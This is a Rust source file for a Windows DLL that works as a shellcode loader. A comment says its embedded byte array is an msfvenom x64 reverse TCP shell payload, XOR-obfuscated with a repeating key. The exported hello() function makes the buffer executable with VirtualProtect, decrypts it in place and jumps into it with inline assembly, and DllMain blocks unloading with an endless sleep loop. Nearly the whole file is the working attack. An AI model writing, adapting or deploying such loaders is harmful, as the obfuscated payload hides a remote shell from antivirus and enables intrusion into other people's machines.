#![feature(core_intrinsics)]
#![allow(non_snake_case, unused_assignments, dead_code, unused_variables, )]

extern crate core;
use std::arch::asm;
use std::ffi::c_void;
use std::intrinsics::black_box;
use std::io::Error;
use std::mem::transmute;

use std::thread;
use std::time::Duration;
const DLL_PROCESS_ATTACH: u32 = 1;
const DLL_PROCESS_DETACH: u32 = 0;

#[no_mangle]
/// a reverse tcp shellcode generated with msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f rust -e generic/none
/// then "encrypted" with the encode_shellcode example
static mut BUF: [u8; 460] = [157, 104, 240, 145, 128, 141, 178, 32, 115, 101, 34, 35, 36, 36, 114, 58, 51, 49, 29, 242, 12, 37, 251, 61, 19, 59, 226, 48, 116, 45, 171, 52, 79, 58, 171, 19, 62, 49, 96, 217, 47, 106, 57, 94, 233, 45, 71, 165, 222, 28, 6, 9, 103, 95, 83, 97, 174, 187, 45, 35, 115, 180, 150, 136, 114, 39, 62, 58, 232, 55, 14, 165, 108, 18, 104, 100, 168, 232, 229, 248, 116, 32, 102, 39, 247, 224, 25, 6, 49, 99, 181, 112, 228, 38, 125, 100, 228, 38, 0, 46, 110, 191, 132, 58, 45, 216, 186, 97, 250, 65, 233, 38, 117, 163, 32, 17, 170, 39, 92, 176, 217, 53, 164, 187, 126, 111, 96, 225, 75, 149, 5, 148, 62, 35, 63, 65, 107, 55, 92, 165, 85, 179, 61, 61, 167, 96, 77, 36, 113, 191, 21, 50, 226, 110, 36, 33, 171, 38, 115, 59, 33, 177, 47, 242, 107, 230, 45, 33, 164, 46, 120, 36, 46, 59, 43, 122, 38, 45, 36, 42, 50, 122, 39, 241, 204, 66, 51, 39, 139, 133, 120, 39, 54, 40, 43, 238, 60, 199, 121, 209, 223, 154, 37, 42, 219, 7, 7, 18, 57, 92, 64, 32, 109, 32, 47, 43, 236, 198, 39, 239, 137, 128, 110, 102, 32, 46, 230, 138, 46, 208, 103, 39, 98, 124, 14, 117, 97, 111, 53, 33, 36, 169, 135, 35, 228, 129, 52, 206, 41, 5, 85, 41, 158, 245, 63, 252, 154, 13, 115, 33, 115, 101, 58, 51, 223, 93, 160, 0, 101, 134, 249, 112, 57, 32, 65, 166, 62, 66, 169, 42, 147, 165, 104, 239, 173, 58, 223, 161, 38, 240, 174, 47, 223, 202, 123, 176, 192, 154, 163, 45, 251, 231, 13, 101, 36, 43, 63, 169, 141, 58, 169, 155, 51, 207, 237, 192, 84, 7, 144, 167, 43, 228, 234, 110, 44, 46, 32, 44, 192, 0, 8, 20, 116, 32, 102, 111, 114, 97, 61, 32, 41, 42, 236, 194, 56, 57, 50, 109, 94, 166, 74, 106, 54, 46, 55, 142, 153, 65, 180, 100, 85, 33, 96, 111, 60, 248, 41, 4, 123, 169, 109, 24, 61, 253, 131, 36, 35, 111, 49, 97, 35, 52, 32, 44, 141, 224, 50, 53, 42, 141, 173, 57, 169, 170, 41, 240, 237, 97, 211, 20, 188, 80, 245, 140, 188, 42, 93, 183, 104, 153, 165, 249, 46, 32, 212, 113, 232, 115, 5, 223, 161, 212, 208, 208, 212, 51, 51, 154, 193, 224, 216, 238, 140, 245, 39, 241, 228, 74, 78, 115, 8, 111, 160, 157, 143, 7, 102, 222, 105, 61, 92, 65, 74, 101, 33, 34, 236, 170, 139, 245];

#[warn(unconditional_panic)]
#[no_mangle]
pub extern "C" fn DllMain(hinstDLL: *mut u8, fdwReason: u32, lpvReserved: c_void) -> u32 {
    match fdwReason {
        DLL_PROCESS_ATTACH => {
            let x = hello as u32;
            println!("the offset of hello: {x:?}"); // do not delete this, as deleting it will change the location of hello() in memory
            return 1;
        }
        _ =>{
            println!("detach requested, but not granted :)");
            loop{
                std::thread::sleep(Duration::from_secs(5)); // if you dont sleep the process will eat up all the cpu
            }
            return 0;
        }
    }
}

#[no_mangle]
pub unsafe extern "C" fn hello() {
    println!("Hello from the dll!");

    let key = b"a super secret key, impossible for anyone to ever guess or brute force.... except for maybe one of google's quantum computers.";

    // mark as execute read write
    let mut old_protect: usize = 0;
    let result = VirtualProtect(BUF.as_mut_ptr() as *mut c_void,std::mem::size_of_val(&BUF),0x40, (&mut old_protect)as *mut _ as *mut u32);
    let err = Error::last_os_error();
    println!("{result},{err:?}");
    xor_repeating_key_encode_in_place(key,&mut BUF);

    //call the decrypted payload
    asm!{
        "call {0}",
        in(reg) BUF.as_ptr()
    };
}

fn xor_repeating_key_encode_in_place(key: &[u8], buf: &mut [u8]) {
    for (i, b) in buf.iter_mut().enumerate() {
        *b ^= key[i % key.len()];
    }
}

fn xor_repeating_key_encode(key: &[u8], buf: &[u8]) -> Vec<u8> {
    let mut out = Vec::new();
    for (i, b) in buf.iter().enumerate() {
        out.push(b ^ key[i % key.len()]);
    }
    out
}

extern "system" {
    pub fn SetLastError(dwErrCode: u32);
    pub fn VirtualProtect(
        lpAddress: *mut c_void,
        dwSize: usize,
        flNewProtect: usize,
        lpflOldProtect: *mut u32
    ) -> i32;
}
